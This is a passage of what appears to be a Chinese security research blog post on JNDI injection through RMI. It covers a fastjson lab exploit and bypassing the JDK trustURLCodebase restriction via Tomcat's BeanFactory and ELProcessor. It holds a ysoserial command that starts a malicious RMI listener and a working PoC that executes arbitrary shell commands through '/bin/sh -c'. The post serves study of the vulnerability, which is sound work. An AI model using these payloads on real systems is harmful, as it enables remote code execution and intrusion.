首先开启一个evil rmi server
    java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener2 host:1099 80 EvilObj "touch /tmp/success"
用[vulhub](https://github.com/vulhub/vulhub/blob/master/fastjson/1.2.24-rce/README.md)的环境
在服务器端会接收到连接
进到docker里可以看到生成了success文件
## 0x04 后续
前文用的环境是JDK8u111，在后续的JDK8u113以及JDK6u132, JDK7u122之后增加了对远程codebase的限制
> 系统属性
> com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase
> 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。如果需要开启 RMI Registry 或者 COS
> Naming Service Provider的远程类加载功能，需要将前面说的两个属性值设置为true。
>
> Changelog:
>
>   * JDK 6u141
> 
>   * JDK 7u131
> 
>   * JDK 8u121
> 
>
>
> 摘自
那么如果存在这样一个漏洞但是又是高版本的JDK环境，该怎么进行bypass呢？
>   1. 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。
>   2. 利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。
>
>
> 摘自
上面的这篇文章提出了上面两种方案来进行。
###  利用底层协议实现上的漏洞
先来说一下第二种，这里提到利用的是LDAP，这部分我们后面再详细叙述，其实原理跟RMI的反序列化问题是一样的。
我在[浅谈Java RMI反序列化问题](http://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/)中曾提到过，JRMPListener利用的是RMI
Client在接收Exception时发生的反序列化漏洞。而这里的JNDI底层用的仍然是RMI那套(如果协议是RMI的话)，所以我们发起一个链接到ysoserial的JRMPListener也还是能成功利用的，不管有没有设置`com.sun.jndi.rmi.object.trustURLCodebase`为true。当然如果要利用成功，发起端必须要有反序列化利用链所依赖的组件并且合适的JDK版本才可以。
###  利用可利用的本地Factory对象
然后我们来继续看看第一种情况
在前面分析NamingManager的getObjectFactoryFromReference时，我略过了本地的factory的载入部分的代码
这里首先会在本地的CLASSPATH里找这个factoryName，如果找到了，后续就不用进行远程加载。所以如果本地可以找到一个可利用的factory，也能突破JNDI的远程加载的限制。
前面的文章中提到了tomcat（或glassfish）中的BeanFactory的利用，来分析一下
首先在后续的调用中，factory的getObjectInstance函数将会被调用
    // ref 为我们传入的Reference 可控
    // name 为factory的name，这里就是我们自己伪造的*EvilObj* 可控
    factory.getObjectInstance(ref, name, nameCtx, environment);
来看一下BeanFactory中getObjectInstance函数的实现，函数有点长，我们挑重点看
    if (obj instanceof ResourceRef) {
                try {
                    Reference ref = (Reference) obj;
                    String beanClassName = ref.getClassName();
                    Class beanClass = null;
                    ClassLoader tcl =
                        Thread.currentThread().getContextClassLoader();
                    if (tcl != null) {
                        try {
                            beanClass = tcl.loadClass(beanClassName);// 载入指定class
                        } catch(ClassNotFoundException e) {
                        }
                    } else {
                        try {
                            beanClass = Class.forName(beanClassName);// 载入指定class
                        } catch(ClassNotFoundException e) {
                            e.printStackTrace();
                        }
                    }
                    // ...
                    // ...
                    Object bean = beanClass.newInstance();// 实例化
先看这部分代码，当前我们传入的Reference必须是ResourceRef对象，并在后续加载ResourceRef的beanClass和shilihuanewInstance进行(而这里的class我们可以在赋值时随意指定)。
    RefAddr ra = ref.get("forceString");
    Map forced = new HashMap<>();
    String value;
    if (ra != null) {
        value = (String)ra.getContent();
        // ...
        /* Items are given as comma separated list */
        for (String param: value.split(",")) {
            param = param.trim();
            index = param.indexOf('=');
            if (index >= 0) {// 如果内容中存在=，提取=后面的字符串作为函数名
                setterName = param.substring(index + 1).trim();
                param = param.substring(0, index).trim();
            } else {
                setterName = "set" +
                             param.substring(0, 1).toUpperCase(Locale.ENGLISH) +
                             param.substring(1);
            }
            try {
                forced.put(param,
                           beanClass.getMethod(setterName, paramTypes));
            } // ...
        }
    }
ReferenceRef存在着可控的键值对关系，通过`get`函数获得，如上述代码`ref.get("forceString")`将会获得forceString相对应的RefAddr，通过调用RefAddr的getContent函数就可以获得forceString键对应的值。
这里需要注意的是，当forceString对应的内容中存在`=`时，将截取`=`后面的字符串作为后续调用的函数名。这意味着我们可以任意指定当前对象的类函数了。force键值对中将包含`=`前面的内容和相应的Method对象。例如`test=eval`,最终我们将得到eval的Method对象
    Enumeration e = ref.getAll();
    while (e.hasMoreElements()) {
        ra = e.nextElement();
        String propName = ra.getType();
        if (propName.equals(Constants.FACTORY) ||
            propName.equals("scope") || propName.equals("auth") ||
            propName.equals("forceString") ||
            propName.equals("singleton")) {
            continue;
        }
        value = (String)ra.getContent();
        Object[] valueArray = new Object[1];
        /* Shortcut for properties with explicitly configured setter */
        Method method = forced.get(propName);
        if (method != null) {
            valueArray[0] = value;
            try {
                method.invoke(bean, valueArray);
            } catch (IllegalAccessException|
                     IllegalArgumentException|
                     InvocationTargetException ex) {
                throw new NamingException
                    ("Forced String setter " + method.getName() +
                     " threw exception for property " + propName);
            }
            continue;
        }
`ref.getAll`获取了所有的RefAddr，对于非`Constants.FACTORY/scope/auth/forceString/singleton`且前文又获取相应的Method对象时，我们将调用该对象，其函数参数为此时RefAddr的内容。比如存在一个RefAddr的type为`test`，将调用前面的`eval`的Method对象。
到这里，我们就完成了一次反射调用，来看看poc
    // payload from kingx
    ResourceRef ref = new ResourceRef(
        "javax.el.ELProcessor",// bean class
        null, "", "",
        true,"org.apache.naming.factory.BeanFactory",// factory class
        null);
    ref.add(new StringRefAddr("forceString", "KINGX=eval"));// eval函数Method对象将会被调用
    ref.add(new StringRefAddr("KINGX",
        """.getClass().forName("javax.script.ScriptEngineManager")" +
            ".newInstance().getEngineByName("JavaScript")" +
            ".eval("new java.lang.ProcessBuilder['(java.lang.String[])'](" +
            "['/bin/sh','-c','"+ command +"'])" +
            ".start()")"));// eval函数的参数为上述执行命令的el语句
## 0x05 总结
前面对JNDI with RMI做了一些简单的介绍，当遇到可控的JNDI lookup函数，我们可以发起JNDI链接到RMI服务上，利用JNDI
Naming Manager的远程codebase加载机制载入任意的bytecodes。
当然，前面的利用方式仅在JDK8u113、JDK6u132,、JDK7u122版本之前，如果遇到了高版本的JDK，我们可以尝试利用本地CLASSPATH中可利用的反序列化利用链，或者是tomcat环境下的可利用的ObjectFactory。
在后续可利用的本地Factory这个思路上，原文作者kingx提出或许其他的中间件环境也可能存在这种可利用的ObjectFactory，这里立个flag，以后有空了一定要找找XD